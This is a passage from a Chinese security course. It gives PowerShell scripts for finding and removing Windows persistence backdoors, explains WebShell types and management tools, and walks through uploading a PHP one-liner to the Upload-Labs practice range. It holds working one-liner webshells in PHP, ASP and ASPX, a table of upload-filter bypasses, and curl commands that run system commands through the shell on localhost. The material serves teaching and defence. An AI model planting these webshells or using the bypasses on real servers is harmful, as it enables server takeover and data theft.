3. 按 `Win+R`，输入 `shell:startup`，检查当前用户启动文件夹
4. 按 `Win+R`，输入 `shell:common startup`，检查所有用户启动文件夹
5. 打开 `services.msc`，重点查看启动类型为“自动”的可疑服务
6. 打开 `taskschd.msc`，检查非系统创建的计划任务

**第三步：命令行方式综合排查**

```powershell
# 1. 检查常见注册表启动项
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -ErrorAction SilentlyContinue

# 2. 检查启动文件夹中的文件
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Get-ChildItem "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# 3. 检查自动启动服务
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"} |
    Select-Object Name, DisplayName, State, StartMode, PathName

# 4. 检查非Microsoft计划任务
Get-ScheduledTask | Where-Object {
    $_.Author -notlike "Microsoft*" -and $_.TaskPath -notlike "\Microsoft*"
} | Select-Object TaskName, TaskPath, Author, State

# 5. 检查登录脚本相关配置
Get-ItemProperty "HKCU:\Environment" -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
```

> ⚠️ **排查重点**：重点关注路径指向 `Temp`、`AppData`、`Users\Public`、随机文件名目录，或者名称伪装成系统组件但发布者未知的项目。

**第四步：清除可疑启动项**

```powershell
# 1. 删除注册表启动项（示例）
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue

# 2. 删除启动文件夹中的可疑文件
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.bat" -Force -ErrorAction SilentlyContinue

# 3. 删除可疑计划任务
schtasks /delete /tn "SystemHealthCheck" /f

# 4. 停止并删除可疑服务
sc.exe stop "SystemDiagnostic"
sc.exe delete "SystemDiagnostic"
```

**第五步：复查验证**

```powershell
# 再次查看注册表启动项
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 再次检查启动文件夹
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# 再次检查计划任务与自动服务
Get-ScheduledTask | Where-Object {$_.Author -notlike "Microsoft*" -and $_.TaskPath -notlike "\Microsoft*"}
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, DisplayName, PathName
```

> 🛡️ **防御建议**：单一启动方式的排查存在盲区。实际工作中应遵循"注册表 → 启动文件夹 → 计划任务 → 服务"的顺序进行综合检查，以最大程度降低遗漏风险。

---

### 实验6：后门全面检测与清除

> 本实验是任务一中最具实战价值的防御实验。系统化的后门检测流程，是安全运维人员必须掌握的核心技能。

**第一步：一键检测脚本**

```powershell
# ============================================
# Windows后门全面检测脚本
# 以管理员身份运行PowerShell
# ============================================

Write-Host "`n========== Windows 后门检测报告 ==========" -ForegroundColor Cyan
Write-Host "检测时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
Write-Host "计算机名: $env:COMPUTERNAME" -ForegroundColor Gray

# 1. 检查注册表启动项
Write-Host "`n[1/7] 检查注册表自启动项..." -ForegroundColor Yellow
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)
foreach ($path in $regPaths) {
    if (Test-Path $path) {
        $props = Get-ItemProperty -Path $path
        $props.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
            Write-Host "  [$path] $($_.Name) = $($_.Value)" -ForegroundColor White
        }
    }
}

# 2. 检查非标准服务
Write-Host "`n[2/7] 检查可疑系统服务..." -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike "*System32*" -and
    $_.PathName -notlike "*SysWOW64*" -and
    $_.PathName -notlike "*Program Files*" -and
    $_.PathName -notlike "*Windows\Microsoft.NET*" -and
    $_.StartMode -eq "Auto"
} | Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize

# 3. 检查非Microsoft计划任务
Write-Host "`n[3/7] 检查可疑计划任务..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {
    $_.Author -notlike "Microsoft*" -and
    $_.Author -notlike "*Adobe*" -and
    $_.Author -ne $null -and
    $_.State -ne "Disabled"
} | Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Author}} | Format-Table -AutoSize

# 4. 检查WMI事件订阅
Write-Host "`n[4/7] 检查WMI事件订阅..." -ForegroundColor Yellow
$filters = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue
$consumers = Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -ErrorAction SilentlyContinue
$bindings = Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
if ($filters) { Write-Host "  发现事件过滤器:" -ForegroundColor Red; $filters | Format-List Name, Query }
if ($consumers) { Write-Host "  发现命令行消费者:" -ForegroundColor Red; $consumers | Format-List Name, CommandLineTemplate }
if ($bindings) { Write-Host "  发现绑定关系:" -ForegroundColor Red; $bindings | Format-List }

# 5. 检查sethc.exe等辅助功能是否被替换
Write-Host "`n[5/7] 检查辅助功能文件完整性..." -ForegroundColor Yellow
$systemFiles = @("sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "displayswitch.exe")
foreach ($file in $systemFiles) {
    $fullPath = "C:\Windows\System32\$file"
    if (Test-Path $fullPath) {
        $hash = (Get-FileHash $fullPath -Algorithm SHA256).Hash
        Write-Host "  $file : $hash" -ForegroundColor White
    }
}
# 注意：需要与已知正常哈希对比才能判断是否被篡改

# 6. 检查可疑网络连接
Write-Host "`n[6/7] 检查可疑网络连接..." -ForegroundColor Yellow
Get-NetTCPConnection -State Established | Where-Object {
    $_.RemoteAddress -notlike "127.0.0.1" -and
    $_.RemoteAddress -notlike "::1" -and
    $_.RemoteAddress -notlike "0.0.0.0"
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{N="Process";E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
    Sort-Object RemoteAddress | Format-Table -AutoSize

# 7. 检查可疑进程
Write-Host "`n[7/7] 检查可疑进程..." -ForegroundColor Yellow
Get-Process | Where-Object {
    $_.Path -and (
        $_.Path -like "*Temp*" -or
        $_.Path -like "*AppData*" -or
        $_.Path -like "*Users\Public*"
    )
} | Select-Object Name, Id, Path, StartTime | Format-Table -AutoSize

Write-Host "`n========== 检测完成 ==========" -ForegroundColor Cyan
```

**第二步：一键清除脚本**（根据检测结果选择性执行）

```powershell
# ============================================
# Windows后门一键清除脚本
# 以管理员身份运行PowerShell
# ============================================

Write-Host "开始清除后门..." -ForegroundColor Red

# 1. 清除注册表后门（根据检测结果修改键名）
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemHealthMonitor" -ErrorAction SilentlyContinue

# 2. 清除计划任务后门
schtasks /delete /tn "SystemHealthCheck" /f 2>$null
schtasks /delete /tn "DiskCleanupTask" /f 2>$null
schtasks /delete /tn "UserProfileSync" /f 2>$null

# 3. 清除服务后门
sc.exe stop "SystemDiagnostic" 2>$null
sc.exe delete "SystemDiagnostic" 2>$null

# 4. 恢复sethc.exe
if (Test-Path "C:\Windows\System32\sethc.exe.bak") {
    Copy-Item "C:\Windows\System32\sethc.exe.bak" "C:\Windows\System32\sethc.exe" -Force
    icacls "C:\Windows\System32\sethc.exe" /reset
    Write-Host "sethc.exe 已恢复" -ForegroundColor Green
}

# 5. 清除WMI事件订阅
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Write-Host "WMI事件订阅已清除" -ForegroundColor Green

# 6. 删除恶意文件
Remove-Item "C:\Windows\Temp\backdoor*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\malware*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\svchost_update*" -Force -ErrorAction SilentlyContinue

Write-Host "`n后门清除完成！请重新运行检测脚本验证。" -ForegroundColor Green
```

---

### 各类持久化技术对比总结

| 技术 | 触发方式 | 权限级别 | 检测难度 | 持久性 | 检测方法 |
| --- | --- | --- | --- | --- | --- |
| 注册表Run键 | 用户登录 | 当前用户 | ⭐⭐ | 高 | 注册表扫描 |
| 计划任务 | 定时/启动/登录 | 可配置SYSTEM | ⭐⭐ | 高 | `Get-ScheduledTask` |
| 系统服务 | 系统启动 | SYSTEM | ⭐⭐ | 非常高 | `Get-Service` |
| WMI事件订阅 | 事件触发 | SYSTEM | ⭐⭐⭐⭐ | 非常高 | WMI命名空间查询 |
| DLL劫持 | 程序启动 | 继承父进程 | ⭐⭐⭐ | 高 | Process Monitor |
| 粘滞键替换 | 登录界面按键 | SYSTEM | ⭐ | 中 | 文件哈希对比 |

---

## 📝 任务一知识点总结

> **本任务核心**：任务一聚焦于操作系统层面的持久化机制；任务二将视角转向 Web 应用层面——剖析 WebShell 这一最常见的 Web 服务器入侵手段，并系统讲解从文件上传漏洞利用、WebShell 连接控制到检测与防护加固的完整攻防过程。

| 知识点 | 要点 |
| --- | --- |
| 后门的本质 | 绕过正常认证的秘密访问通道，核心目的是**持久化** |
| 注册表后门 | Run键在用户登录时自动执行，最容易检测也最容易实现 |
| 服务后门 | 以SYSTEM权限开机自运行，通过`sc`命令创建，需重点排查非标准服务 |
| 计划任务后门 | 灵活的触发机制（定时/启动/登录/事件），使用`Get-ScheduledTask`检测 |
| WMI后门 | 最高级的持久化技术，无文件落地，极难检测，需查询WMI命名空间 |
| 粘滞键后门 | 利用登录界面辅助功能，替换System32下的关键程序 |
| 检测原则 | 多维度排查——注册表+服务+计划任务+WMI+网络连接+进程+文件哈希 |
| 防御原则 | 最小权限+应用白名单+EDR+日志审计+定期安全扫描 |

---

# 任务二 WebShell上传和连接

## 🧠 理论知识

### 木马（Trojan）的分类

**木马**（Trojan Horse）是一类伪装成合法或可信软件、依赖用户主动安装而完成投放的恶意程序。其名称源于古希腊神话中特洛伊木马的典故——外形为礼物，内部隐藏士兵。木马与病毒、蠕虫的根本区别在于：**木马不具备自我复制能力**，其传播完全依赖社会工程学手段（如钓鱼、捆绑、伪装下载）诱骗受害者执行。

| 类型 | 说明 | 典型代表 |
| --- | --- | --- |
| **远控木马（RAT）** | 全功能远程控制，屏幕监控、文件管理、命令执行 | Cobalt Strike、Metasploit、Gh0st |
| **信息窃取木马（Stealer）** | 窃取浏览器密码、Cookie、加密货币钱包 | RedLine、Raccoon |
| **键盘记录器（Keylogger）** | 记录键盘输入，获取账号密码 | 软件型/硬件型 |
| **后门木马（Backdoor）** | 维持对系统的持久访问 | 与任务一的后门技术配合使用 |
| **下载者（Downloader）** | 体积小，功能仅为下载并执行其他恶意软件 | 常作为攻击链的第一阶段 |
| **勒索木马（Ransomware）** | 加密文件勒索赎金 | WannaCry、LockBit |
| **挖矿木马（Cryptominer）** | 占用系统资源进行加密货币挖矿 | 常见于服务器入侵后 |

---

### WebShell深度解析

#### 什么是WebShell？

**WebShell** 是以网页脚本形式存在于Web服务器上的恶意程序。攻击者通过浏览器向WebShell发送HTTP请求，WebShell接收参数并在服务器上执行，将结果通过HTTP响应返回给攻击者。

```
WebShell的工作原理：

攻击者浏览器
    │
    │  HTTP POST请求
    │  URL: http://target/uploads/shell.php
    │  Body: cmd=whoami
    │
    ▼
Web服务器（IIS/Apache/Nginx）
    │
    │  解析PHP/ASP/ASPX脚本
    │
    ▼
WebShell脚本执行
    │
    │  @eval($_POST['cmd'])
    │  → 执行系统命令: whoami
    │
    ▼
返回命令执行结果（HTML格式）

    │  HTTP 200 响应
    │  Body: <pre>nt authority\iusr</pre>
    │
    ▼
攻击者浏览器显示结果
```

#### WebShell的分类详解

对 WebShell 的分类需要从多个维度考察，单一维度的划分容易造成概念混淆。常见且严谨的分类维度有以下三种。

**维度一：按代码体积与功能完备度划分**

| 类型 | 代码量 | 功能特征 | 典型用途 |
| --- | --- | --- | --- |
| **一句话木马**（One-liner） | 通常 1 行 | 仅含一个 `eval` 类调用，接收外部参数并执行 | 体积最小，作为最初的滩头阵地；后续操作依赖客户端工具（菜刀/蚁剑/冰蝎等） |
| **小马**（上传马） | 数十行 | 简易文件上传、目录浏览、基础命令执行 | 一句话木马上传成功后，再上传小马以建立可视化上传通道，进而部署大马 |
| **大马**（管理马） | 数百~数千行 | 完整的文件管理、命令执行、数据库操作、端口扫描、提权、反弹 Shell 等 | 自带管理后台 UI 的"WebShell 控制台"，可独立使用 |

> 💡 **三者并非完全并列**：从实现方式看，一句话木马可视为小马的极简形态。攻击实战中三者常配合使用——一句话木马 → 上传小马 → 上传大马，形成由简到繁、由小到大的阶梯式部署。

**维度二：按通信特征划分（直接影响检测难度）**

| 类型 | 通信特征 | 代表实现 | 静态检测难度 | 流量检测难度 |
| --- | --- | --- | --- | --- |
| **明文 WebShell** | 请求/响应为明文，函数特征显著 | 经典一句话木马、菜刀适用木马 | ⭐（易，特征字明显） | ⭐（易，POST 体含 `eval`、`base64_decode`） |
| **变形/免杀 WebShell** | 通过变量函数、字符串拼接、编码混淆规避特征匹配 | 各类"过狗""过D盾"变种 | ⭐⭐⭐（中难） | ⭐⭐（依赖行为分析） |
| **加密 WebShell** | 请求/响应通过 AES、自定义算法等加密 | 冰蝎（Behinder）、哥斯拉（Godzilla） | ⭐⭐⭐⭐（难，无法静态判断） | ⭐⭐⭐⭐（需基于流量行为、熵值分析） |
| **内存马**（无文件 WebShell） | 不落地为文件，驻留于 Web 容器进程内存中 | Servlet/Filter 型、Tomcat Valve 型、IIS 模块型 | ⭐⭐⭐⭐⭐（无文件可扫） | ⭐⭐⭐⭐⭐（仅能从内存与请求逻辑发现） |

> ⚠️ **常见误区**：很多教材把"代码越短越难检测"作为评级依据。事实并非如此——经典明文一句话木马尽管只有一行，但 `eval`、`$_POST` 等关键字过于显眼，**反而是 D 盾、河马等静态扫描工具最先识别的目标**。决定检测难度的根本因素是 **是否经过免杀变形、是否加密、是否落盘**，而非代码长短。

**维度三：按服务端语言划分**

| 语言      | 适用环境                                       | 典型扩展名                   | 关键执行函数                                                  |
| ------- | ------------------------------------------ | ----------------------- | ------------------------------------------------------- |
| PHP     | Apache + PHP / Nginx + PHP-FPM / IIS + PHP | `.php`、`.phtml`、`.php5` | `eval`、`assert`、`system`、`exec`、`shell_exec`、`passthru` |
| ASP（经典） | IIS + ASP（已淘汰但部分老系统仍存在）                    | `.asp`、`.asa`、`.cer`    | `Execute`、`Eval`、`CreateObject("WScript.Shell")`        |
| ASP.NET | IIS + .NET Framework / .NET                | `.aspx`、`.ashx`         | `Eval`（JScript）、`Process.Start`、`Assembly.Load`         |
| JSP     | Tomcat、JBoss、WebLogic 等 Java 容器            | `.jsp`、`.jspx`          | `Runtime.exec`、`ProcessBuilder`                         |

> 💡 **语言适配的必要性**：WebShell 必须与目标服务端环境匹配——PHP 木马放到纯 IIS+ASP.NET 环境只会被作为静态文本返回。攻击者通常先通过响应头、扩展名、报错信息等进行指纹识别，再选用对应语言的木马。

**各语言一句话木马示例**：

```php
<!-- PHP 一句话木马 -->
<?php @eval($_POST['cmd']);?>
<!-- @符号抑制错误信息输出 -->
<!-- $_POST['cmd'] 接收POST参数cmd的值 -->
<!-- eval() 将字符串作为PHP代码执行 -->
```

```asp
<!-- ASP 一句话木马 -->
<%execute(request("cmd"))%>
<!-- request("cmd") 接收请求参数cmd -->
<!-- execute() 将字符串作为VBScript代码执行 -->
```

```aspx
<!-- ASPX 一句话木马（Jscript版） -->
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
```

> 💡 **eval 是 WebShell 的核心机制**：所有一句话木马的实现都建立在 `eval`（或 `assert`、`system`、`exec` 等同类函数）之上——它们能将运行时收到的字符串作为代码执行。攻击者通过 HTTP 请求传入待执行的命令，服务端 `eval` 调用后将结果回写。这也解释了为何安全检测工具会重点扫描代码中的 `eval`、`assert`、`base64_decode` 等高危函数。

#### WebShell管理工具

| 工具 | 通信方式 | 特点 | 检测难度 |
| --- | --- | --- | --- |
| **中国菜刀（China Chopper）** | 明文POST | 经典工具，特征明显，已被杀软广泛识别 | ⭐（易） |
| **冰蝎（Behinder）** | AES加密通信 | 流量加密，每次连接密钥随机，绕过IDS/WAF | ⭐⭐⭐（难） |
| **哥斯拉（Godzilla）** | 自定义加密算法 | 支持多种加密方式，高度可定制 | ⭐⭐⭐⭐（很难） |
| **蚁剑（AntSword）** | 明文/加密 | 开源，插件丰富，社区活跃 | ⭐⭐（中） |
| **Weevely** | 加密通信 | Python编写，Kali内置，针对PHP | ⭐⭐⭐（难） |

**菜刀连接WebShell的通信过程**（以PHP一句话木马为例）：

```
中国菜刀 → 目标服务器

POST /uploads/shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=@eval(base64_decode($_POST[action]));&action=ZWNobyAiSGVsbG8iOw==

响应:
HTTP/1.1 200 OK
Hello
```

> 🔍 **检测线索**：菜刀的POST请求体特征明显（包含`eval`、`base64_decode`等关键字），WAF和IDS可以通过这些特征进行检测。但冰蝎和哥斯拉使用加密通信，传统特征检测失效，需要基于流量行为分析（如请求/响应大小异常、固定周期通信等）。

---

### WebShell 部署的主要途径——文件上传漏洞

文件上传漏洞是攻击者投放 WebShell 最常见的渠道。其完整利用链包含从漏洞探测到服务器完全沦陷的四个阶段：

```
文件上传漏洞利用链：

┌─────────────────────────────────────────────────────────┐
│ 第一阶段：发现上传点                                      │
│ • 目录扫描发现 upload.php、admin/upload.html 等           │
│ • 查看前端源码中的文件上传表单                             │
│ • 测试API接口的文件上传功能                                │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第二阶段：绕过前端验证                                    │
│ • 删除JavaScript验证代码（浏览器F12）                     │
│ • 禁用JavaScript                                         │
│ • 使用Burp Suite拦截并修改请求                            │
│ • 直接构造POST请求，跳过前端                              │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第三阶段：绕过后端验证                                    │
│                                                         │
│ Content-Type验证    → 修改Content-Type为image/jpeg       │
│ 扩展名黑名单        → 使用.php5、.phtml、.asa等           │
│ 扩展名大小写        → .PhP、.pHp（部分系统区分大小写）    │
│ 双写绕过            → .pphphp → 去除中间php后变.php      │
│ 00截断              → shell.php%00.jpg（老版本PHP）       │
│ 图片马              → 在图片文件中嵌入PHP代码              │
│ .htaccess覆盖       → 上传.htaccess修改解析规则           │
│ 竞争条件            → 在文件被删除前快速访问执行           │
│ IIS解析漏洞         → shell.asp;.jpg（IIS6.0特性）       │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第四阶段：利用WebShell                                    │
│ • 访问上传后的WebShell URL                                │
│ • 使用菜刀/冰蝎/哥斯拉连接                                │
│ • 执行系统命令、管理文件、连接数据库                       │
│ • 提权、横向移动、数据窃取                                │
└─────────────────────────────────────────────────────────┘
```

**后端验证绕过方式对照表**：

| 验证方式 | 绕过方法 | 原理 |
| --- | --- | --- |
| Content-Type检查 | 修改为`image/jpeg` | 只检查MIME类型，不检查文件内容 |
| 文件扩展名黑名单 | 使用`php5`、`phtml`、`asa` | 黑名单不完整，遗漏了可执行扩展名 |
| 扩展名大小写 | `.PhP`、`.Php` | Windows不区分大小写，Linux区分 |
| 文件头检查（图片马） | 在GIF89a头后嵌入PHP代码 | 检查文件头字节但不检查全部内容 |
| 重命名上传文件 | 双写绕过、00截断 | 过滤逻辑存在缺陷 |

---

### WebShell检测与防御

#### WebShell的检测方法

| 方法 | 工具/技术 | 说明 |
| --- | --- | --- |
| **文件特征扫描** | D盾、河马WebShell查杀、ClamAV | 基于代码特征（eval、base64等关键字）匹配 |
| **文件哈希比对** | MD5/SHA256校验 | 与已知WebShell哈希数据库对比 |
| **文件内容分析** | 人工审查+自动化脚本 | 分析文件中的高风险函数调用 |
| **流量分析** | WAF、IDS/IPS | 检测异常HTTP请求模式（如固定POST到.aspx） |
| **行为检测** | EDR、RASP | 监控Web进程的异常行为（如cmd.exe子进程） |
| **文件完整性监控** | FIM工具 | 监控Web目录文件变更 |

#### WebShell防御体系

```
WebShell防御四层体系：

第一层：预防（事前）
├── 上传目录禁止脚本执行权限（最关键！）
├── 文件上传白名单验证（仅允许图片/文档等安全类型）
├── 上传文件重命名（随机化文件名）
├── 限制上传文件大小
└── Content-Type + 文件头 + 扩展名多重验证

第二层：检测（事中）
├── WAF实时检测异常请求
├── RASP监控Web进程行为
└── IDS/IPS检测已知WebShell通信特征

第三层：响应（事后）
├── 定期扫描Web目录（D盾/河马）
├── 文件完整性监控（新文件告警）
├── 分析Web访问日志（异常POST请求）
└── 分析系统日志（Web进程启动cmd等异常）

第四层：恢复
├── 清除WebShell文件
├── 修复上传漏洞
├── 审查后门和持久化
└── 加固Web服务器配置
```

---

## 🛠️ 实践操作

### 实验7：安装phpStudy并配置Upload-Labs靶场

**phpStudy** 是集成 Apache/Nginx、PHP、MySQL 的 Windows 一体化运行环境，能够大幅降低 PHP 环境的搭建成本，适合用于教学与安全靶场部署。

> ⚠️ **Server 2025 兼容性说明**：phpStudy 2018 旧版可能在 Windows Server 2025 上出现 VC 运行库兼容性问题。建议使用**小皮面板（phpStudy Pro）最新版**（支持 PHP 5.6~8.x 切换）。Upload-Labs 靶场的部分关卡（如 Pass-11/12 的 00 截断）需要 PHP 5.3 以下版本才能复现，在 PHP 7.x+ 环境中这些漏洞已被修复，课堂演示时可跳过这些关卡或仅做原理讲解。

**操作步骤**：

**第一步：安装phpStudy**

1. 下载小皮面板（phpStudy Pro）最新版：访问官网 `https://www.xp.cn/` 下载Windows版安装包
2. 运行安装程序，安装路径建议使用默认（如 `C:\phpstudy_pro\`）或 `D:\phpstudy_pro\`
3. 安装完成后启动小皮面板，在"首页"点击"启动"Apache和MySQL服务
4. 等待Apache和MySQL状态变为绿色"运行中"
5. 验证：打开浏览器访问 `http://localhost/`，显示"站点创建成功"或phpStudy默认页面

> ⚠️ **预期结果**：浏览器显示phpStudy默认欢迎页面。如果显示"无法访问此网站"，检查：（1）Apache是否启动成功；（2）80端口是否被IIS或其他程序占用（`netstat -ano | findstr :80`）。如果80端口被IIS占用，需先在"服务器管理器"中停止IIS，或在小皮面板中将Apache端口改为8080。

**第二步：配置PHP版本**

1. 在小皮面板中，点击左侧"网站" → 选中站点 → "PHP版本"下拉框
2. 选择 **PHP 5.6**（Upload-Labs部分关卡需要低版本PHP才能复现漏洞）
3. 如果没有PHP 5.6，点击"软件管理" → "PHP" → 安装PHP 5.6版本
4. 切换版本后Apache会自动重启

> 💡 **为何选择 PHP 5.6？** Upload-Labs 的 Pass-11/12（00 截断漏洞）需 PHP < 5.3.4 才能复现；Pass-13~16（图片马 + 文件包含）在所有 PHP 版本均可复现。PHP 5.6 是教学环境的折中选择——既能覆盖绝大多数关卡，又不至于过于陈旧。

**第三步：部署Upload-Labs靶场**

```powershell
# Upload-Labs项目地址：https://github.com/c0ny1/upload-labs
# 方法一：直接下载ZIP解压（推荐，无需git）
# 1. 浏览器访问 https://github.com/c0ny1/upload-labs
# 2. 点击绿色"Code"按钮 → Download ZIP
# 3. 将ZIP解压到网站根目录

# 确认网站根目录位置（小皮面板默认）
ls C:\phpstudy_pro\WWW\

# 将解压后的upload-labs文件夹放到WWW目录下
# 最终目录结构应为：C:\phpstudy_pro\WWW\upload-labs\index.php

# 方法二：使用git克隆（需安装git）
cd C:\phpstudy_pro\WWW
git clone https://github.com/c0ny1/upload-labs.git
```

**第四步：验证靶场部署成功**

1. 打开浏览器访问：`http://localhost/upload-labs/`
2. 应看到Upload-Labs首页，显示"upload-labs"标题和关卡列表（Pass-01 ~ Pass-21）
3. 点击任意关卡（如Pass-01），应显示文件上传表单

> ⚠️ **预期结果**：看到Upload-Labs的关卡选择界面。如果显示空白页或PHP源码，说明PHP未正确配置；如果显示404，检查目录路径是否正确。

**第五步：创建上传目录并设置权限**

```powershell
# Upload-Labs需要upload目录有写入权限
# 检查upload目录是否存在
ls C:\phpstudy_pro\WWW\upload-labs\upload\

# 如果不存在则创建
mkdir C:\phpstudy_pro\WWW\upload-labs\upload

# 确保Web服务有写入权限（小皮面板环境通常已自动配置）
```

**第六步：了解关卡结构**

Upload-Labs包含21个不同难度的关卡，涵盖所有常见的文件上传验证绕过技术：

| 关卡 | 验证类型 | 绕过方法 |
| --- | --- | --- |
| Pass-01 | 前端JavaScript验证 | 禁用JS或Burp Suite拦截修改 |
| Pass-02 | Content-Type验证 | 修改Content-Type为image/jpeg |
| Pass-03 | 扩展名黑名单（不完整） | 使用.php5、.phtml等 |
| Pass-04 | .htaccess覆盖 | 上传.htaccess文件 |
| Pass-05 | 大小写绕过 | 使用.PhP扩展名 |
| Pass-06 | 空格绕过 | 文件名末尾加空格 |
| Pass-07 | 点号绕过 | 文件名末尾加点 |
| Pass-08 | ::$DATA绕过 | Windows NTFS特性 |
| Pass-09 | 点+空格组合绕过 | 多次组合 |
| Pass-10 | 双写绕过 | `.pphphp` |
| Pass-11-12 | 00截断 | `%00`截断（GET/POST） |
| Pass-13-16 | 文件头/图片马 | 图片文件嵌入PHP代码 |
| Pass-17-21 | 条件竞争等高级技术 | race condition |

---

### 实验8：上传WebShell（以Pass-01为例）

> ⚠️ **前置条件**：本实验需要先完成实验7，确保phpStudy已启动且Upload-Labs可正常访问。同时需要安装Burp Suite Community Edition（免费版即可）。

**场景说明**：Pass-01 关卡采用前端 JavaScript 校验，仅允许图片类型扩展名上传。本实验目标是绕过该校验，成功上传 PHP 一句话木马并验证其可执行性。

**操作步骤**：

**第一步：准备一句话木马**

```php
// 保存为 shell.php
<?php @eval($_POST['cmd']);?>
```

**第二步：绕过前端验证（方法一：Burp Suite拦截修改）**

1. 将一句话木马文件 `shell.php` 重命名为 `shell.jpg`（用于通过前端JS验证）
2. 浏览器设置代理为 `127.0.0.1:8080`（Burp Suite默认监听端口）
   - Chrome：设置 → 系统 → 打开代理设置 → 手动设置代理 → 地址`127.0.0.1`，端口`8080`
3. 在Burp Suite中开启拦截（Proxy → Intercept → "Intercept is on"）
4. 在Upload-Labs Pass-01页面选择 `shell.jpg` 并点击上传（前端JS验证通过）
5. Burp Suite拦截到请求，在请求体中找到 `filename="shell.jpg"`，改为 `filename="shell.php"`
6. 点击 Forward 转发修改后的请求
7. 页面提示上传成功，并显示上传后的文件路径

**第二步：绕过前端验证（方法二：浏览器禁用JavaScript，无需Burp Suite）**

1. 在Chrome浏览器中按 `F12` 打开开发者工具
2. 按 `Ctrl+Shift+P` 打开命令面板，输入 `javascript`，选择"Disable JavaScript"
3. 刷新Upload-Labs Pass-01页面（此时前端JS验证已失效）
4. 直接选择 `shell.php` 文件上传
5. 上传成功后，记得重新启用JavaScript（同样方法选择"Enable JavaScript"）

**第三步：验证WebShell上传成功**

```bash
# 在浏览器中直接访问WebShell（或使用curl）
curl http://localhost/upload-labs/upload/shell.php

# 如果返回空白页面（无报错），说明PHP代码已成功执行
# 通过POST参数执行命令
curl -d "cmd=system('whoami');" http://localhost/upload-labs/upload/shell.php
curl -d "cmd=system('ipconfig');" http://localhost/upload-labs/upload/shell.php
curl -d "cmd=system('net user');" http://localhost/upload-labs/upload/shell.php
```

> ⚠️ **预期结果**：
> - 第一条curl返回空白（PHP执行了eval但没有输出内容）
> - `whoami` 应返回Web服务运行的用户身份（如 `nt authority\system` 或 `desktop-xxx\administrator`）
> - `ipconfig` 应返回靶机的网络配置信息
> - `net user` 应返回靶机上所有用户账户列表
>
> 如果返回404，说明上传路径不对，检查Upload-Labs的upload目录位置；如果返回PHP源码文本，说明PHP未正确解析。

> 💡 **前端验证不可作为安全防线**：前端 JavaScript 完全在用户浏览器中执行，用户可任意修改、禁用或绕过相关逻辑。因此所有安全校验**必须在服务端独立实施**，前端校验仅承担提升交互体验的作用（如即时反馈），不能用作安全屏障。

> 🛡️ **最简单有效的防御**：在 IIS 中对上传目录（如 `upload`）禁止脚本执行权限。打开 IIS 管理器 → 展开网站 → 右键 `upload` 目录 → 处理程序映射 → 编辑功能权限 → **取消勾选"脚本"** → 确定。这样即使攻击者成功上传了 WebShell 文件，服务器也不会执行它，只会将其作为纯文本返回——从根本上阻断 WebShell 的利用链。

---

